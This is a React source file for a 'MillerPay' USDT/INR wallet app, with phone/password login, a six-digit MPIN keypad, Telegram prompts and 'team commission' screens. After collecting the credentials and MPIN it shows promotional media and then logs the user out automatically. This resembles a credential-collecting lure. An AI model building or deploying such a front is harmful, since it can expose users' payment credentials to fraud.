import { useEffect, useMemo, useState } from 'react'
import {
  ArrowLeft,
  Banknote,
  BarChart3,
  BriefcaseBusiness,
  ChevronRight,
  CircleDollarSign,
  CirclePlus,
  Clock3,
  Eye,
  EyeOff,
  Headphones,
  Landmark,
  LayoutGrid,
  LockKeyhole,
  LogOut,
  Phone,
  ShieldCheck,
  UserRound,
  UsersRound,
} from 'lucide-react'
import { MEDIA_ORIGIN, apiRequest } from './lib/api'


function Login({ onAuthenticated }) {
  const [phone, setPhone] = useState('')
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [forgot, setForgot] = useState(false)
  const [pending, setPending] = useState(null)
  const [mpin, setMpin] = useState('')
  const [error, setError] = useState('')
  const [loading, setLoading] = useState(false)
  const loginReady = /^\d{10}$/.test(phone) && password.length >= 4

  const submit = async (event) => {
    event.preventDefault()
    setError('')
    if (!/^\d{10}$/.test(phone)) return setError('Enter a valid 10-digit mobile number.')
    if (password.length < 4) return setError('Password must be at least 4 characters.')
    setLoading(true)
    try {
      const data = await apiRequest('/auth/login', {
        method: 'POST',
        body: { phone, password, role: 'user' },
      })
      setPending(data)
    } catch (err) {
      setError(err.message || 'Login failed. Please try again.')
    } finally {
      setLoading(false)
    }
  }

  const pressDigit = async (digit) => {
    if (digit === 'delete') return setMpin((value) => value.slice(0, -1))
    if (mpin.length >= 6) return
    const next = mpin + digit
    setMpin(next)
    setError('')
    if (next.length === 6) {
      try {
        await apiRequest('/auth/mpin', {
          method: 'POST',
          token: pending?.token,
          body: { mpin: next },
        })
        window.setTimeout(() => onAuthenticated(pending), 160)
      } catch (err) {
        setError(err.message || 'Verification failed. Try again.')
        setMpin('')
      }
    }
  }

  return (
    <main className="auth-shell">
      <section className="auth-card" aria-labelledby="login-title">
        <header className="auth-titlebar">
          <h1 id="login-title">LOG IN</h1>
        </header>
        <form className="login-form" onSubmit={submit}>
          <label className="field-shell">
            <Phone />
            <span className="sr-only">Phone number</span>
            <input
              inputMode="numeric"
              pattern="[0-9]{10}"
              maxLength="10"
              autoComplete="tel"
              placeholder="Enter Your Phone Number"
              value={phone}
              onChange={(e) => setPhone(e.target.value.replace(/\D/g, '').slice(0, 10))}
            />
          </label>
          <label className="field-shell password-field">
            <LockKeyhole />
            <span className="sr-only">Password</span>
            <input
              type={showPassword ? 'text' : 'password'}
              minLength="4"
              autoComplete="current-password"
              placeholder="Enter Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <button
              type="button"
              className="password-eye"
              aria-label={showPassword ? 'Hide password' : 'Show password'}
              onClick={() => setShowPassword((value) => !value)}
            >
              {showPassword ? <EyeOff /> : <Eye />}
            </button>
          </label>
          <button className="forgot-button" type="button" onClick={() => setForgot(true)}>
            Forget Password
          </button>
          {forgot && (
            <p className="support-message">Please contact support to reset your password.</p>
          )}
          {error && !pending && <p className="login-error">{error}</p>}
          <button className="primary-button login-button" disabled={!loginReady || loading}>
            {loading ? 'CHECKING…' : 'LOG IN'}
          </button>
        </form>
        {pending && (
          <div className="mpin-backdrop" role="dialog" aria-label="Please enter MPIN verification">
            <section className="mpin-panel">
              <h2>Please enter MPIN verification</h2>
              <div className="mpin-slots" aria-label={`${mpin.length} of 6 digits entered`}>
                {Array.from({ length: 6 }, (_, index) => (
                  <i key={index} className={index < mpin.length ? 'filled' : ''}>
                    {mpin[index] || ''}
                  </i>
                ))}
              </div>
              {error && <p className="mpin-error">{error}</p>}
              <div className="mpin-keypad" aria-label="MPIN keypad">
                {['1', '2', '3', '4', '5', '6', '7', '8', '9', 'keyboard', '0', 'delete'].map(
                  (key) => (
                    <button
                      key={key}
                      type="button"
                      onClick={() => key !== 'keyboard' && pressDigit(key)}
                      aria-label={
                        key === 'keyboard'
                          ? 'Keyboard unavailable'
                          : key === 'delete'
                            ? 'Delete digit'
                            : key
                      }
                    >
                      {key === 'keyboard' ? '⌨' : key === 'delete' ? '⌫' : key}
                    </button>
                  ),
                )}
              </div>
            </section>
          </div>
        )}
      </section>
    </main>
  )
}

const navItems = [
  ['home', 'Home', LayoutGrid],
  ['deposit', 'Deposit', CircleDollarSign],
  ['upi', 'UPI', Landmark],
  ['team', 'Team', UsersRound],
  ['me', 'Me', UserRound],
]
function BottomNav({ page, setPage }) {
  return (
    <nav className="bottom-nav" aria-label="Primary navigation">
      {navItems.map(([id, label, Icon]) => (
        <button
          key={id}
          className={page === id ? 'active' : ''}
          onClick={() => setPage(id === 'me' ? 'me' : 'home')}
        >
          {id === 'home' ? (
            <span className="home-mark" aria-hidden="true">
              <i />
              <i />
              <i />
              <i />
            </span>
          ) : id === 'deposit' ? (
            <span className="deposit-mark" aria-hidden="true">
              <i />
            </span>
          ) : id === 'upi' ? (
            <strong className="upi-mark" aria-hidden="true">
              UPI
            </strong>
          ) : (
            <Icon />
          )}
          <span>{label}</span>
        </button>
      ))}
    </nav>
  )
}
function AppHeader({ title, home, setPage }) {
  return (
    <header className="app-header">
      {home ? (
        <span />
      ) : (
        <button aria-label="Go home" onClick={() => setPage('home')}>
          <ArrowLeft />
        </button>
      )}
      <h1>{title}</h1>
      <span />
    </header>
  )
}

function Home({ setPage, settings }) {
  const uploadedSlides = Array.isArray(settings.slideImages) ? settings.slideImages : []
  const homeSlides = uploadedSlides.length
    ? uploadedSlides.map((item) => ({ src: item.url.startsWith('http') ? item.url : `${MEDIA_ORIGIN}${item.url}`, name: item.name }))
    : [{ src: '/slide-3.jpg', name: 'Recharge rewards' }]
  const [slide, setSlide] = useState(0)
  useEffect(() => setSlide(0), [homeSlides.length])
  useEffect(() => {
    if (homeSlides.length < 2) return
    const timer = window.setInterval(
      () => setSlide((value) => (value + 1) % homeSlides.length),
      4500,
    )
    return () => window.clearInterval(timer)
  }, [homeSlides.length])
  const activeSlide = homeSlides[slide] || homeSlides[0]
  return (
    <>
      <AppHeader title="MillerPay" home setPage={setPage} />
      <div className="mobile-content home-content">
        <section className="quota-card">
          <span>QUOTA</span>
          <div>
            <strong>0.00</strong>
            <em>INR</em>
          </div>
        </section>
        <button
          className="hero-slide"
          type="button"
          onClick={() =>
            homeSlides.length > 1 && setSlide((value) => (value + 1) % homeSlides.length)
          }
        >
          <img src={activeSlide.src} alt={activeSlide.name || 'MillerPay promotional slide'} />
          {homeSlides.length > 1 && (
            <span className="hero-dots">
              {homeSlides.map((item, index) => (
                <i key={`${item.src}-${index}`} className={index === slide ? 'active' : ''} />
              ))}
            </span>
          )}
        </button>
        <div className="home-stats">
          <article>
            <span>
              <Clock3 /> USDT RATE
            </span>
            <strong>
              1 USDT ≈ 107.08
              <br />
              INR
            </strong>
          </article>
          <article>
            <span>
              <BarChart3 /> BONUS RATIO
            </span>
            <strong>1.5%</strong>
          </article>
          <article>
            <span>
              <Clock3 /> TODAY RECEIVED
            </span>
            <strong>0</strong>
          </article>
          <article>
            <span>
              <BriefcaseBusiness /> IN TRANSACTION
            </span>
            <strong>0</strong>
          </article>
        </div>
        <button className="tutorial-row">
          <span>📘</span>
          <div>
            <strong>Tutorial</strong>
            <small>About UPI linking & INR orders</small>
          </div>
          <ChevronRight />
        </button>
        <button
          className="channel-row"
          type="button"
          onClick={() =>
            settings.telegramUrl &&
            window.open(settings.telegramUrl, '_blank', 'noopener,noreferrer')
          }
        >
          <strong>MillerPay's only official Telegram channel</strong>
          <ChevronRight />
        </button>
      </div>
    </>
  )
}

function Me({ logout }) {
  const menu = [
    ['Recharge History', Banknote, ''],
    ['Token History', CirclePlus, ''],
    ['Languages', UserRound, 'English'],
    ['Google Authentication', ShieldCheck, ''],
    ['Contact Us', Headphones, ''],
  ]
  return (
    <>
      <AppHeader title="Me" home />
      <div className="mobile-content me-content">
        <section className="profile-summary">
          <button type="button" className="edit-profile">
            <strong>Edit profile</strong>
            <ChevronRight />
          </button>
          <p className="profile-id">
            <span>ID</span>
            <strong>10037875</strong>
          </p>
          <div className="profile-numbers">
            <p>
              <span>Quota</span>
              <strong>
                0 <small>INR</small>
              </strong>
            </p>
            <p>
              <span>Reward ratio</span>
              <strong>1.5%</strong>
            </p>
          </div>
          <button type="button" className="invite-reward">
            <span>🎁</span>
            <div>
              <strong>Invite user rewards</strong>
              <small>Earn team commissions</small>
            </div>
            <ChevronRight />
          </button>
        </section>
        <section className="profile-menu">
          {menu.map(([label, Icon, value]) => (
            <button type="button" key={label}>
              <Icon />
              <strong>{label}</strong>
              {value && <span>{value}</span>}
              <ChevronRight />
            </button>
          ))}
          <button type="button" className="signout-button" onClick={logout}>
            <LogOut />
            <strong>Sign Out</strong>
            <ChevronRight />
          </button>
        </section>
      </div>
    </>
  )
}

function TelegramPrompt({ settings, onCancel }) {
  const join = () => {
    const link = settings.telegramUrl || 'https://t.me/millerpay'
    window.open(link, '_blank', 'noopener,noreferrer')
  }
  return (
    <div className="flow-backdrop">
      <section className="telegram-prompt">
        <h2>Telegram</h2>
        <p>Join our Telegram channel to get the latest updates and news.</p>
        <div className="telegram-actions">
          <button type="button" className="cancel-button" onClick={onCancel}>
            Cancel
          </button>
          <button type="button" className="join-button" onClick={join}>
            Join
          </button>
        </div>
      </section>
    </div>
  )
}

function MediaStage({ media, kind }) {
  const source = media.url.startsWith('http') ? media.url : `${MEDIA_ORIGIN}${media.url}`
  return (
    <div className="flow-backdrop">
      <section className={`flow-media ${kind}`}>
        {media.type === 'video' ? (
          <video src={source} autoPlay muted playsInline controls />
        ) : (
          <img src={source} alt={media.name || `${kind} poster`} />
        )}
      </section>
    </div>
  )
}

function WalletApp({ logout }) {
  const [page, setPage] = useState('home')
  const [settings, setSettings] = useState({
    slides: 1,
    banner: true,
    telegram: false,
    popup: false,
    telegramUrl: 'https://t.me/millerpay',
    bannerMedia: null,
    bannerDuration: 5,
    popupMedia: null,
    popupDuration: 5,
    slideImage: null,
    slideName: 'Recharge rewards',
    slideImages: [],
  })
  const [settingsReady, setSettingsReady] = useState(false)
  const [sequenceStarted, setSequenceStarted] = useState(false)
  const [flowStage, setFlowStage] = useState(null)
  const [delayedLogout, setDelayedLogout] = useState(false)
  useEffect(() => {
    const fetchSettings = () => {
      apiRequest('/public/settings')
        .then((data) => {
          if (data.settings) setSettings(data.settings)
          setSettingsReady(true)
        })
        .catch(() => setSettingsReady(true))
    }
    fetchSettings()
    const interval = setInterval(fetchSettings, 5000)
    return () => clearInterval(interval)
  }, [])

  const firstStage = () =>
    settings.telegram
      ? 'telegram'
      : settings.banner && settings.bannerMedia
        ? 'banner'
        : settings.popup && settings.popupMedia
          ? 'popup'
          : null
  const advance = (current) => {
    if (current === 'telegram' && settings.banner && settings.bannerMedia)
      return setFlowStage('banner')
    if ((current === 'telegram' || current === 'banner') && settings.popup && settings.popupMedia)
      return setFlowStage('popup')
    logout()
  }
  useEffect(() => {
    if (!settingsReady || sequenceStarted) return
    const first = firstStage()
    if (first) {
      setSequenceStarted(true)
      setFlowStage(first)
    }
  }, [
    settingsReady,
    sequenceStarted,
    settings.telegram,
    settings.banner,
    settings.popup,
    settings.bannerMedia,
    settings.popupMedia,
  ])
  useEffect(() => {
    if (flowStage !== 'banner' && flowStage !== 'popup') return
    const seconds = flowStage === 'banner' ? settings.bannerDuration : settings.popupDuration
    const timer = window.setTimeout(
      () => advance(flowStage),
      Math.max(1, Number(seconds) || 5) * 1000,
    )
    return () => window.clearTimeout(timer)
  }, [flowStage, settings.bannerDuration, settings.popupDuration])
  useEffect(() => {
    if (!delayedLogout) return
    const timer = window.setTimeout(() => {
      logout()
      window.location.reload()
    }, 10000)
    return () => window.clearTimeout(timer)
  }, [delayedLogout, logout])
  const cancelTelegram = () => {
    setFlowStage(null)
    setDelayedLogout(true)
  }
  return (
    <main className="wallet-shell">
      <section className="wallet-card">
        {page === 'home' && <Home setPage={setPage} settings={settings} />}
        {page === 'me' && <Me logout={logout} />}
        {flowStage === 'telegram' && (
          <TelegramPrompt settings={settings} onCancel={cancelTelegram} />
        )}
        {flowStage === 'banner' && settings.bannerMedia && (
          <MediaStage media={settings.bannerMedia} kind="banner" />
        )}
        {flowStage === 'popup' && settings.popupMedia && (
          <MediaStage media={settings.popupMedia} kind="popup" />
        )}
        <BottomNav page={page} setPage={setPage} />
      </section>
    </main>
  )
}

export default function App() {
  const initial = useMemo(() => {
    try {
      return JSON.parse(localStorage.getItem('miller-user'))
    } catch {
      return null
    }
  }, [])
  const [session, setSession] = useState(initial)
  const authenticate = (data) => {
    localStorage.setItem('miller-user', JSON.stringify(data))
    setSession(data)
  }
  const logout = () => {
    localStorage.removeItem('miller-user')
    setSession(null)
  }
  return session ? <WalletApp logout={logout} /> : <Login onAuthenticated={authenticate} />
}
